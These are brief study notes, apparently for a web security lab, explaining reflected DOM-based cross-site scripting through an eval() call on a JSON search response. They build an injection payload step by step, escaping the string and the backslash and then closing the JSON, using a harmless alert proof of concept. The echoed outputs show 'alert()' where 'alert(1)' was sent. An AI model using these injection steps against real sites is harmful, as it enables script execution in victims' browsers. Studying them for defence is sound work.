# reflected dom-based

The server processes data from the request, and echoes the data into the response, the reflected data might be placed into a JavaScript string literal, or a data item within the DOM, such as a form field.

- might an `eval()` called on the data -> very dangerous

## example

in a case of

`/search-results?search=duck`

get a result:

`{ "results": [], "searchTerm": "duck" }`

there is an eval for the searchTerm:

`eval('var searchResultsObj = ' + this.responseText);`

what looks like:

`var searchResultsObj = "duck"`

#### lets try to escape from it:

with `-alert(1)` we tell js to try to evaluate the expression but before js evaluates it js have to execute the `alert(1)`, so the `-` forces js hands

```
/search-results?search=duck"-alert(1)

->

{"results":[],"searchTerm":"duck\"-alert()"}
```

js try to fix it with an escape character \

lets try to escape the escape character

```
/search-results?search=duck\"-alert(1)

->

{"results":[],"searchTerm":"duck\\"-alert()"}
```

that works but now the the json is broken, need to close it

```
/search-results?search=duck\"-alert(1)}//

->

{"results":[],"searchTerm":"duck\\"-alert()}//"}
```
